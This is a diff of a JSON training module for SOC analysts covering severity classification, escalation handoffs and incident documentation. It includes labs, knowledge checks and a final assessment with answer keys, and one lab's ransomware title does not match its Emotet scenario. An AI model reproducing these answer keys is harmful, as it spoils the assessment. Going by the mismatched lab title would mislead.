+                  "description": "Same Trojan on DC-01: Critical severity due to enterprise-wide identity compromise potential.",
+                  "highlight": "Crown Jewel compromise threatens entire corporate infrastructure."
+                }
+              ],
+              "conclusion": "Severity is determined by contextual business risk, not just the technical malware name."
+            }
+          },
+          "estimatedMinutes": 6,
+          "xpReward": 30
+        },
+        {
+          "id": "unit-5-4",
+          "type": "INTERACTIVE",
+          "title": "Topic 4: [Lab] 🔵 Severity Classification",
+          "order": 4,
+          "content": {
             "interactive": {
-              "type": "classification",
-              "data": {
-                "title": "Classify the Severity",
-                "scenarios": [
-                  {
-                    "id": 1,
-                    "situation": "Ransomware detected encrypting files on CEO's laptop",
-                    "evidence": "High confidence - EDR confirmed ransomware signature",
-                    "options": [
-                      "Low",
-                      "Medium",
-                      "High",
-                      "Critical"
-                    ],
-                    "correctAnswer": "Critical",
-                    "explanation": "Active ransomware on executive system = Maximum impact + High confidence = Critical severity. Immediate response required."
-                  },
-                  {
-                    "id": 2,
-                    "situation": "Employee accessed website on blocklist",
-                    "evidence": "User claims accidental click, immediately closed",
-                    "options": [
-                      "Low",
-                      "Medium",
-                      "High",
-                      "Critical"
-                    ],
-                    "correctAnswer": "Low",
-                    "explanation": "No malware downloaded, user aware and closed immediately. Low impact + benign explanation = Low severity."
-                  },
-                  {
-                    "id": 3,
-                    "situation": "Unusual outbound traffic to new domain",
-                    "evidence": "Could be legitimate cloud service or C2 communication",
-                    "options": [
-                      "Low",
-                      "Medium",
-                      "High",
-                      "Critical"
-                    ],
-                    "correctAnswer": "Medium",
-                    "explanation": "Potential data exfiltration (high impact) but uncertain if malicious (low confidence) = Medium severity. Requires investigation."
-                  }
-                ]
-              }
+              "title": "Classify 4 Security Incidents into Severity Tiers",
+              "scenario": "Review each incident scenario below and classify its operational severity (Critical, High, Medium, or Low).",
+              "evidence": [
+                {
+                  "label": "Incident A: Active Directory Database Export",
+                  "detail": "ntdsutil exported ntds.dit password database from Primary Domain Controller DC-01. Severity: CRITICAL."
+                },
+                {
+                  "label": "Incident B: Single Workstation Malware Dropper",
+                  "detail": "Emotet trojan downloaded on workstation WS-102. Host isolated immediately via EDR. Severity: HIGH."
+                },
+                {
+                  "label": "Incident C: Multiple Failed Logins",
+                  "detail": "25 failed password attempts on marketing employee user account from internal workstation. Severity: MEDIUM."
+                },
+                {
+                  "label": "Incident D: Adware Browser Toolbar",
+                  "detail": "Browser shopping coupon extension installed on guest network laptop. Severity: LOW."
+                }
+              ]
             }
           },
           "estimatedMinutes": 12,
-          "xpReward": 100
+          "xpReward": 60
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-5-1",
-          "title": "Severity Assessment",
+          "title": "Severity Classification and SLAs",
           "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "What two factors determine severity classification?",
+            "text": "Which of the following incidents represents a Critical (P1) severity level requiring a 15-minute response SLA?",
             "options": [
-              "Impact and Confidence",
-              "Speed and Accuracy",
-              "User and System",
-              "Time and Location"
+              "A user asking for assistance resetting their Outlook password",
+              "Active ransomware encrypting shared drives across multiple enterprise file servers and domain controllers",
+              "A marketing employee installing an unauthorized photo editing application",
+              "A firewall dropping routine port scan probes from the internet"
             ],
-            "correctAnswer": "Impact and Confidence",
-            "explanation": "Severity is calculated based on the potential impact (how bad could this be?) and confidence (how sure are we this is real?). Both factors must be considered together."
+            "correctAnswer": "Active ransomware encrypting shared drives across multiple enterprise file servers and domain controllers",
+            "explanation": "Ransomware actively spreading across core servers and domain controllers causes enterprise-wide operational paralysis and requires immediate P1 Critical response."
           },
-          "xpReward": 30
+          "xpReward": 25
         }
       ]
     },
@@ -567,91 +532,94 @@
       "id": "topic-6",
       "title": "Escalation",
       "order": 6,
-      "description": "Know when and how to escalate incidents",
+      "description": "Execute seamless incident escalation: tier-to-tier handoffs (L1 → L2, L2 → L3), specialist team engagement, and management briefings.",
       "units": [
         {
           "id": "unit-6-1",
           "type": "THEORY",
-          "title": "The Escalation Path",
+          "title": "Topic 1: Tiered Escalation: L1 → L2 and L2 → L3",
           "order": 1,
           "content": {
-            "text": "Knowing when to escalate is just as important as knowing how to investigate. L1 analysts are the first line of defense, but not every incident should be handled at L1.",
-            "subtitle": "When to ask for help",
-            "visual": {
-              "type": "workflow",
-              "component": "EscalationPath"
-            },
+            "text": "Escalation is the formal transfer of an investigation when technical scope exceeds standard playbooks. Tier 1 escalates to Tier 2 when an alert is verified as a True Positive, requires host memory forensics, or needs complex lateral movement tracking. Tier 2 escalates to Tier 3 when custom malware reverse-engineering, rootkit analysis, or enterprise-wide threat hunting is required.",
+            "subtitle": "Handoff Responsibilities Across the 3-Tier SOC Model",
             "techBox": {
-              "title": "Escalation Tiers",
-              "content": "L1 Analyst: Triage, basic investigation, false positive identification\nL2 Analyst: Deep investigation, correlation, IOC analysis\nL3 / Senior Analyst: Threat hunting, advanced forensics, malware analysis\nSpecialist: Domain experts (network, endpoint, cloud, OT)\nManagement: Business impact decisions, external communications"
+              "title": "Tier Responsibilities",
+              "content": "• Tier 1 (Triage): Alert intake, IOC extraction, basic containment (host isolation), warm handoff\n• Tier 2 (Incident Response): Memory forensics, root cause analysis, lateral movement tracking, eradication\n• Tier 3 (Threat Hunter / SME): Binary disassembly, kernel debugging, custom YARA/Sigma creation, threat intel"
             }
           },
           "estimatedMinutes": 8,
-          "xpReward": 50
+          "xpReward": 40
         },
         {
           "id": "unit-6-2",
           "type": "THEORY",
-          "title": "When to Escalate",
+          "title": "Topic 2: Specialist & Management Escalation",
           "order": 2,
           "content": {
-            "text": "Clear escalation criteria prevent both under-escalation (missing critical threats) and over-escalation (wasting senior analyst time). Here are the standard triggers.",
-            "subtitle": "Escalation decision points",
-            "visual": {
-              "type": "decision-tree",
-              "component": "EscalationDecisionTree"
-            },
+            "text": "Specialist Escalation routes technical requirements to external IT teams: Network Engineering for border firewall blocks and BGP null-routes; IAM Admins for Kerberos Golden Ticket resets (krbtgt rotation). Management Escalation alerts the CISO, Legal, and PR when incidents involve regulatory deadlines (e.g. GDPR 72-hour notification) or executive data.",
+            "subtitle": "Cross-Functional Crisis Coordination and Regulatory Deadlines",
             "techBox": {
-              "title": "Escalate Immediately If:",
-              "content": "✓ Confirmed malware or ransomware\n✓ Active data exfiltration\n✓ Privilege escalation detected\n✓ Critical system compromise\n✓ Multiple related alerts (potential campaign)\n✓ Unable to determine if true/false positive\n✓ Involves executive or sensitive system\n✓ Exceeds your investigation capability"
-            },
-            "knowMore": {
-              "title": "It's OK to Escalate",
-              "content": "New analysts sometimes hesitate to escalate, fearing they'll look inexperienced. The opposite is true - knowing your limits and escalating appropriately is a sign of good judgment. Seniors would rather investigate a false alarm than miss a real breach because an L1 analyst didn't escalate."
+              "title": "Specialist Roles",
+              "content": "• Network Engineers: Edge ACLs, PCAP captures, DNS sinkholes\n• IAM / AD Admins: Krbtgt password rotation, enterprise session revocation\n• Legal Counsel: Regulatory breach disclosure notices (GDPR, HIPAA, SEC)\n• Corporate PR: Unified communications to media and affected customers"
             }
           },
-          "estimatedMinutes": 7,
-          "xpReward": 50
+          "estimatedMinutes": 8,
+          "xpReward": 40
         },
         {
           "id": "unit-6-3",
-          "type": "THEORY",
-          "title": "How to Escalate Effectively",
+          "type": "DEMO",
+          "title": "Topic 3: [Demo] Incident Escalation Handoff",
           "order": 3,
           "content": {
-            "text": "A good escalation provides all the context the next analyst needs to continue the investigation without starting from scratch. This saves time and ensures continuity.",
-            "subtitle": "Writing effective escalation notes",
-            "visual": {
-              "type": "template",
-              "component": "EscalationTemplate"
-            },
-            "techBox": {
-              "title": "Escalation Must Include:",
-              "content": "Summary: Brief description of the incident\nSeverity: Your assessed severity level\nEvidence: Key findings and IOCs\nTimeline: When did events occur?\nActions Taken: What you've already done\nRecommendation: What you think should happen next\nUrgency: Why this needs immediate attention"
+            "demo": {
+              "title": "Executing a Professional Warm Handoff",
+              "description": "Watch a Tier 1 analyst package evidence, apply initial host isolation, and brief the on-call Tier 2 responder.",
+              "steps": [
+                {
+                  "order": 1,
+                  "title": "Basic Containment Applied",
+                  "description": "Analyst confirms True Positive trojan on FIN-WS-09 and immediately isolates host via EDR console.",
+                  "highlight": "Containment stops active attacker communication before handoff."
+                },
+                {
+                  "order": 2,
+                  "title": "Briefing Package Assembled",
+                  "description": "Analyst documents affected user, host, IP, SHA-256 hash, and second-by-second timeline.",
+                  "highlight": "Structured packaging prevents Tier 2 from re-doing basic triage."
+                },
+                {
+                  "order": 3,
+                  "title": "Direct Notification",
+                  "description": "Analyst reassigns ticket to Tier 2 queue and notifies on-call responder in the SOC war room.",
+                  "highlight": "Direct communication eliminates handover delays."
+                }
+              ],
+              "conclusion": "A warm handoff ensures critical investigation momentum is maintained during high-stakes incidents."
             }
           },
           "estimatedMinutes": 6,
-          "xpReward": 50
+          "xpReward": 30
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-6-1",
-          "title": "Escalation Scenarios",
+          "title": "Incident Escalation Protocols",
           "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "You've triaged an alert and confirmed malware on a user's laptop. The malware appears to be actively communicating with an external server. What should you do?",
+            "text": "What is a 'warm handoff' during incident escalation, and why is it superior to a 'cold handoff'?",
             "options": [
-              "Close the alert - you identified the issue",
-              "Escalate immediately to L2",
-              "Reboot the laptop and monitor",
-              "Wait until tomorrow to see if it continues"
+              "A warm handoff requires physically handing a paper file to a manager",
+              "A warm handoff involves direct communication with the receiving responder, including a summary of findings, verified IOCs, and actions taken, ensuring zero lost time",
+              "A warm handoff can only be done during daylight hours",
+              "A cold handoff is always preferred because it avoids talking to colleagues"
             ],
-            "correctAnswer": "Escalate immediately to L2",
-            "explanation": "Confirmed malware with active C2 communication is a clear escalation trigger. This requires immediate senior analyst attention for containment and further investigation."
+            "correctAnswer": "A warm handoff involves direct communication with the receiving responder, including a summary of findings, verified IOCs, and actions taken, ensuring zero lost time",
+            "explanation": "Warm handoffs transfer full context, containment status, and technical artifacts directly to the receiving responder, preventing duplicate effort and response delays."
           },
-          "xpReward": 35
+          "xpReward": 25
         }
       ]
     },
@@ -659,228 +627,201 @@
       "id": "topic-7",
       "title": "SOC Documentation",
       "order": 7,
-      "description": "Master the art of documenting security investigations",
+      "description": "Master professional incident documentation: the 5 core pillars (Findings, Evidence, Timeline, Actions, Recommendations), ticketing excellence, and audit readiness.",
       "units": [
         {
           "id": "unit-7-1",
           "type": "THEORY",
-          "title": "Why Documentation Matters",
+          "title": "Topic 1: The 5 Pillars of Documentation (Findings, Evidence, Timeline, Actions, Recommendation)",
           "order": 1,
           "content": {
-            "text": "Documentation is not just paperwork - it's evidence, institutional knowledge, and legal protection. Your notes might be reviewed by lawyers, auditors, or investigators months or years later.",
-            "subtitle": "Your investigation lives forever",
-            "visual": {
-              "type": "diagram",
-              "component": "DocumentationImportance"
-            },
+            "text": "In security operations, 'If it wasn't documented, it never happened.' An audit-grade report contains Five Core Pillars: Findings (executive summary and root cause), Evidence (hashes, IPs, command lines, log snippets), Timeline (second-by-second UTC chronology), Actions (exact containment and remediation steps taken), and Recommendations (strategic preventative controls to stop recurrence).",
+            "subtitle": "The Five Essential Components of Professional Security Records",
             "techBox": {
-              "title": "Documentation Serves Multiple Purposes",
-              "content": "Legal: Court admissible evidence\nAudit: Compliance and regulatory requirements\nKnowledge: Training and process improvement\nCommunication: Handoffs between shifts/analysts\nMetrics: Measuring SOC performance\nPost-Incident: Learning from incidents"
+              "title": "The Five Pillars of SOC Documentation",
+              "content": "1. Findings: Executive summary, root cause, affected scope\n2. Evidence: SHA-256 hashes, C2 IPs/domains, process execution trees\n3. Timeline: Chronological sequence of events standardized in ISO 8601 UTC\n4. Actions: Containment steps, host isolation, account resets, firewall blocks\n5. Recommendations: Hardening advice (GPO restrictions, MFA, rule tuning)"
             }
           },
-          "estimatedMinutes": 7,
+          "estimatedMinutes": 10,
           "xpReward": 50
         },
         {
           "id": "unit-7-2",
-          "type": "THEORY",
-          "title": "What to Document",
+          "type": "DEMO",
+          "title": "Topic 2: [Demo] Writing an Effective SOC Ticket",
           "order": 2,
           "content": {
-            "text": "Complete documentation tells the story of your investigation from start to finish. Future analysts should be able to understand exactly what you did and why.",
-            "subtitle": "The investigation narrative",
-            "visual": {
-              "type": "template",
-              "component": "DocumentationTemplate"
-            },
-            "techBox": {
-              "title": "Essential Documentation Elements",
-              "content": "Alert Details: What triggered the investigation\nTimeline: Chronological sequence of events\nEvidence: Logs, screenshots, IOCs collected\nActions Taken: Every step of your investigation\nFindings: What you discovered\nConclusion: True/false positive, severity, disposition\nRecommendations: Suggested next steps or improvements"
-            }
-          },
-          "estimatedMinutes": 8,
-          "xpReward": 50
-        },
-        {
-          "id": "unit-7-3",
-          "type": "DEMO",
-          "title": "Writing a SOC Ticket",
-          "order": 3,
-          "content": {
             "demo": {
-              "title": "Documenting the FinCorp Investigation",
-              "description": "See how to document our earlier FinCorp failed login investigation",
+              "title": "Ticket Writing: Deficient vs Gold-Standard",
+              "description": "Compare a vague, rejected analyst ticket against an audit-ready, professional security ticket.",
               "steps": [
                 {
                   "order": 1,
-                  "title": "Alert Information",
-                  "description": "Start with what triggered the investigation",
-                  "highlight": "Alert: Multiple Failed Login Attempts\nUser: Finance01 (Sarah Johnson)\nHost: FIN-PC-04\nTime: 2024-01-15 14:32:18\nSeverity: Medium"
+                  "title": "Deficient Ticket Example",
+                  "description": "Notes state: 'User had malware. Ran antivirus and closed.' No timestamps, no hash, no root cause.",
+                  "highlight": "Fails regulatory audits and leaves systems vulnerable to reinfection."
                 },
                 {
                   "order": 2,
-                  "title": "Investigation Summary",
-                  "description": "Briefly describe what you did",
-                  "highlight": "Investigated alert for 10 failed login attempts to Finance01 account. Verified user identity, checked login patterns, and reviewed subsequent activity."
+                  "title": "Gold-Standard Ticket Header",
+                  "description": "Title: [HIGH] Emotet Dropper on FIN-WS-09 | Severity: High | Asset: FIN-WS-09 | User: CORP\\jdoe.",
+                  "highlight": "Provides complete context in standard operational fields."
                 },
                 {
                   "order": 3,
-                  "title": "Key Findings",
-                  "description": "Document your discoveries",
-                  "highlight": "1. Failed logins occurred outside normal business hours\n2. Source IP 192.168.10.45 is user's assigned workstation\n3. User contacted - confirmed she forgot password after returning from vacation\n4. No successful logins after failed attempts\n5. User reset password with IT at 14:45"
+                  "title": "Technical Findings & Evidence",
+                  "description": "Attaches process tree, SHA256: 4a2b91..., and C2 IP 198.51.100.42.",
+                  "highlight": "Forensic artifacts enable threat intelligence matching."
                 },
                 {
                   "order": 4,
-                  "title": "Evidence",
-                  "description": "List supporting evidence",
-                  "highlight": "Event ID 4625 (x10) from FIN-PC-04\nUser confirmation email\nIT ticket #12345 for password reset"
-                },
-                {
-                  "order": 5,
-                  "title": "Conclusion",
-                  "description": "State your final determination",
-                  "highlight": "False Positive - Legitimate user forgot password. No malicious activity detected. Ticket closed."
+                  "title": "Actions & Hardening Recommendations",
+                  "description": "Documents host isolation at 03:18 UTC and recommends disabling macros for Finance OU.",
+                  "highlight": "Transforms an incident into permanent organizational resilience."
                 }
               ],
-              "conclusion": "This documentation tells the complete story. Anyone reading this ticket understands what happened and why you closed it."
-            }
-          },
-          "estimatedMinutes": 10,
-          "xpReward": 75
-        },
-        {
-          "id": "unit-7-4",
-          "type": "THEORY",
-          "title": "Documentation Best Practices",
-          "order": 4,
-          "content": {
-            "text": "Professional documentation is clear, concise, and objective. Follow these best practices to ensure your notes are useful and professional.",
-            "subtitle": "Writing like a professional analyst",
-            "visual": {
-              "type": "comparison",
-              "component": "GoodVsBadDocumentation"
-            },
-            "techBox": {
-              "title": "Documentation Guidelines",
-              "content": "DO:\n✓ Use clear, professional language\n✓ Document in real-time as you investigate\n✓ Include timestamps\n✓ Be specific (IP addresses, event IDs, etc.)\n✓ State facts, not opinions\n\nDON'T:\n✗ Use slang or informal language\n✗ Skip steps or assume things are obvious\n✗ Forget to document negative findings\n✗ Make assumptions without evidence\n✗ Include personal opinions or speculation"
+              "conclusion": "Professional documentation satisfies auditors, protects the company legally, and hardens enterprise defenses."
             }
           },
           "estimatedMinutes": 6,
-          "xpReward": 50
+          "xpReward": 30
+        },
+        {
+          "id": "unit-7-3",
+          "type": "INTERACTIVE",
+          "title": "Topic 3: [Lab] 🖥️ Create Incident Ticket",
+          "order": 3,
+          "content": {
+            "interactive": {
+              "title": "Draft an Incident Ticket for Confirmed Ransomware Attack",
+              "scenario": "You have verified an Emotet infection on FIN-WS-09. Assemble all five documentation pillars into an audit-ready ticket.",
+              "evidence": [
+                {
+                  "label": "Pillar 1: Findings",
+                  "detail": "Executive Summary: Workstation FIN-WS-09 infected with Emotet trojan via weaponized email invoice attachment. Blast radius contained to single host."
+                },
+                {
+                  "label": "Pillar 2: Evidence",
+                  "detail": "SHA256: 4a2b91e847c10b... | C2: 198.51.100.42:8443 | Payload: C:\\Users\\Public\\staged.exe"
+                },
+                {
+                  "label": "Pillar 3: Timeline",
+                  "detail": "03:12:04 UTC Email delivered -> 03:14:22 UTC Macro executed -> 03:15:00 UTC Alert fired -> 03:18:04 UTC Host isolated"
+                },
+                {
+                  "label": "Pillar 4: Actions Taken",
+                  "detail": "Host isolated via CrowdStrike Falcon; user password reset; external C2 IP blocked at perimeter firewall"
+                },
+                {
+                  "label": "Pillar 5: Recommendations",
+                  "detail": "Enforce GPO 'Block macros in Office files from the Internet' across Finance OU; conduct user phishing refresher"
+                }
+              ]
+            }
+          },
+          "estimatedMinutes": 12,
+          "xpReward": 60
         }
       ],
       "knowledgeChecks": [
         {
           "id": "kc-7-1",
           "title": "Documentation Essentials",
-          "type": "MULTIPLE_SELECT",
+          "type": "MULTIPLE_CHOICE",
           "order": 1,
           "question": {
-            "text": "Which of these should be included in incident documentation? (Select all that apply)",
+            "text": "Why must all timestamps in SOC incident documentation be strictly standardized in UTC?",
             "options": [
-              "Timeline of events",
-              "Your personal opinion about the user",
-              "Evidence collected (logs, screenshots)",
-              "Actions you took during investigation",
-              "Your guess about what might happen next",
-              "Factual conclusions based on evidence"
+              "UTC looks more professional in email signatures",
+              "Enterprises operate across distributed global time zones; standardizing on UTC prevents chronological ambiguity during forensic correlation",
+              "UTC prevents hackers from seeing the time of the attack",
+              "Security ticketing systems cannot understand local time zones"
             ],
-            "correctAnswer": [
-              "Timeline of events",
-              "Evidence collected (logs, screenshots)",
-              "Actions you took during investigation",
-              "Factual conclusions based on evidence"
-            ],
-            "explanation": "Professional documentation includes objective facts: timelines, evidence, actions, and fact-based conclusions. Personal opinions and speculation should not be included."
+            "correctAnswer": "Enterprises operate across distributed global time zones; standardizing on UTC prevents chronological ambiguity during forensic correlation",
+            "explanation": "Standardizing on UTC eliminates confusion across international assets, remote employees, server logs, and daylight savings transitions."
           },
-          "xpReward": 40
+          "xpReward": 25
         }
       ]
     }
   ],
   "assessment": {
-    "id": "assessment-04",
-    "title": "Module 04: SOC Operations Assessment",
-    "description": "Test your understanding of SOC operations and L1 analyst workflows",
+    "id": "module-04-assessment",
+    "title": "Module 04: SOC Operations Comprehensive Assessment",
+    "description": "Final certification exam evaluating your operational mastery across all 7 topics: SOC Architecture, Alerts & Events, Alert Triage, False Positives, Severity Classification, Escalation Protocols, and Incident Documentation.",
+    "passingScore": 70,
     "questions": [
       {
-        "id": "q1",
+        "id": "q-1",
+        "question": "A Tier 1 analyst receives an alert for encoded PowerShell execution spawned by Microsoft Excel on an accounting workstation. Which of the following sequences represents the correct triage and response procedure?",
+        "options": [
+          "Close the alert as expected financial activity without checking process arguments",
+          "Reboot the workstation immediately, delete the Excel file, and email the user",
+          "Understand the alert rule, extract User/Host/IP entities, inspect parent-child process lineage, de-obfuscate arguments, and isolate the host upon confirming malicious C2 download",
+          "Escalate immediately to the CEO without documenting technical findings or isolating the host"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Methodical triage requires understanding detection logic, extracting entities, decoding script arguments, verifying evidence, and applying immediate containment (host isolation) before escalating.",
         "type": "MULTIPLE_CHOICE",
-        "question": "What are the three pillars of SOC architecture?",
-        "options": [
-          "People, Process, Technology",
-          "Detection, Response, Recovery",
-          "Monitoring, Analysis, Action",
-          "Prevention, Detection, Correction"
-        ],
-        "correctAnswer": "People, Process, Technology",
-        "points": 10
-      },
-      {
-        "id": "q2",
-        "type": "ORDERING",
-        "question": "Order these from lowest to highest in the security hierarchy:",
-        "items": [
-          "Event",
-          "Alert",
-          "Incident",
-          "Case"
-        ],
-        "correctAnswer": [
-          0,
-          1,
-          2,
-          3
-        ],
-        "points": 15
-      },
-      {
-        "id": "q3",
-        "type": "MULTIPLE_CHOICE",
-        "question": "What percentage of alerts are typically false positives in a SOC?",
-        "options": [
-          "10-20%",
-          "30-50%",
-          "60-80%",
-          "90-95%"
-        ],
-        "correctAnswer": "90-95%",
-        "points": 10
-      },
-      {
-        "id": "q4",
-        "type": "MULTIPLE_SELECT",
-        "question": "Which situations require immediate escalation to L2? (Select all)",
-        "options": [
-          "Confirmed ransomware detection",
-          "User forgot their password",
-          "Active data exfiltration",
-          "Failed antivirus update",
-          "Privilege escalation detected"
-        ],
-        "correctAnswer": [
-          "Confirmed ransomware detection",
-          "Active data exfiltration",
-          "Privilege escalation detected"
-        ],
         "points": 20
       },
       {
-        "id": "q5",
-        "type": "SCENARIO",
-        "question": "An alert shows 50 failed SSH login attempts to a Linux server from an external IP in the last hour. The server is a production web server accessible from the internet. What severity would you assign?",
+        "id": "q-2",
+        "question": "During shift review, an analyst discovers that scheduled vulnerability scans by the internal Nessus scanner (10.0.99.10) generate 1,500 port scan alerts every Wednesday night. How should this be handled?",
         "options": [
-          "Low - Just failed attempts",
-          "Medium - External brute force attempt",
-          "High - Production server under attack",
-          "Critical - Immediate data breach"
+          "Block the Nessus scanner IP address at the internal firewall",
+          "Turn off all firewall alerting permanently",
+          "Document the authorized change ticket, resolve current alerts as False Positives (Expected Activity), and submit a rule tuning ticket to exclude the scanner IP from port scan alerting",
+          "Escalate to Tier 3 as an ongoing distributed denial of service attack"
         ],
-        "correctAnswer": "Medium - External brute force attempt",
-        "explanation": "This is a brute force attempt (medium severity). It's concerning but hasn't succeeded yet. High severity would be if logins succeeded. Critical would be if there's confirmed compromise.",
-        "points": 15
+        "correctAnswer": 2,
+        "explanation": "Authorized vulnerability scanning is expected administrative activity. Documenting the change record and submitting a SIEM tuning ticket eliminates noise without creating blind spots.",
+        "type": "MULTIPLE_CHOICE",
+        "points": 20
+      },
+      {
+        "id": "q-3",
+        "question": "An active ransomware intrusion is detected actively encrypting shared volumes across the enterprise Primary Domain Controller (DC-01). What severity rating must be assigned, and what is the typical SLA response timeframe?",
+        "options": [
+          "Low (P4) with a 24-hour response SLA",
+          "Medium (P3) with a 4-hour response SLA",
+          "Critical (P1) with a 15-minute response SLA, 24/7 emergency bridge activation, and executive leadership notification",
+          "Informational (P5) with no response required"
+        ],
+        "correctAnswer": 2,
+        "explanation": "Ransomware actively compromising domain controllers threatens enterprise survival; it is classified as Critical (P1) with a mandatory 15-minute response SLA.",
+        "type": "MULTIPLE_CHOICE",
+        "points": 20
+      },
+      {
+        "id": "q-4",
+        "question": "When handing off an ongoing, contained incident from Tier 1 to Tier 2 (L1 → L2 Escalation), what must be included in the 'warm handoff' package?",
+        "options": [
+          "Just the alert ID and the word 'help'",
+          "Executive findings, affected User/Host/IP entities, verified technical IOCs (hashes/C2 IPs), chronological UTC timeline, proof of host containment, and direct notification to the responder",
+          "The analyst personal cell phone number only",
+          "A request to close the ticket immediately"
+        ],
+        "correctAnswer": 1,
+        "explanation": "A warm handoff provides structured findings, verified IOCs, timeline, and containment proof so Tier 2 can immediately begin deep forensics without re-triaging.",
+        "type": "MULTIPLE_CHOICE",
+        "points": 20
+      },
+      {
+        "id": "q-5",
+        "question": "What are the Five Core Pillars of professional SOC incident documentation that ensure audit and regulatory compliance?",
+        "options": [
+          "Findings, Evidence, Timeline, Actions, Recommendations",
+          "Introduction, Hypothesis, Experiment, Results, Conclusion",
+          "User ID, Password, Hash, IP, Port",
+          "Firewall, SIEM, EDR, SOAR, NDR"
+        ],
+        "correctAnswer": 0,
+        "explanation": "Audit-proof incident documentation requires Findings (summary), Evidence (technical IOCs), Timeline (chronology in UTC), Actions (containment steps), and Recommendations (preventative hardening).",
+        "type": "MULTIPLE_CHOICE",
+        "points": 20
       }
     ],
-    "passingScore": 70,
     "totalPoints": 100
   }
 }
